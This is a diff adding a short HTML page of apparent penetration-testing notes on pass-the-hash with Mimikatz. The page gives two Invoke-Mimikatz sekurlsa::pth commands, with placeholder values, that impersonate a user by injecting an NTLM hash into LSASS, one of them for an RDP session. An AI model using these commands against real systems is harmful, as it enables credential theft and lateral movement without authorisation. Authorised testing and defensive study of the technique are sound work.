@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>via Mimikatz</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Using Hashes - from Windows - via Mimikatz</h1></strong><br /><br /><strong><h2>## Mimikatz - pass the hash</h2></strong><br />REQUIRES ADMINISTRATOR PRIVILEGES TO RUN<br /><br />Mimikatz injects the hash into LSASS memory.<br />Can now access network resources as that user.<br /><br /><code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe&quot;&#39;</code><br /><br /><strong><h3>### RDP</h3></strong><br />Start mstsc.exe with Mimikatz to RDP in remotely using the hash.<br />Restricted Admin Mode needs to be enabled on the target server - <a href="https://docs.microsoft.com/en-gb/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2">https://docs.microsoft.com/en-gb/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2</a><br /><br /><code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:mstsc.exe /restrictedadmin&quot;&#39;</code></div>
+</body>
+</html>
